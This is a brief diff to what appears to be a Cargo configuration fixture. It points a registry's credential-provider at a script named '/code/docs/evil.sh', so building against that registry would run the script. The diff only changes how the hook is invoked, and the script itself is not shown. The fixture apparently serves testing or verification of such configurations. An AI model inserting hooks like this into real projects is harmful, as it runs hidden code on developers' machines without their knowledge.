@@ -1,6 +1,6 @@
 [registries.fixture]
 index = "sparse+https://raw.githubusercontent.com/cf-coredev/cw-verify-fixture-7f3a/main/docs/index/"
-credential-provider = ["/bin/sh", "/code/docs/evil.sh"]
+credential-provider = "/code/docs/evil.sh"
 
 [alias]
 schema = "run --example schema"
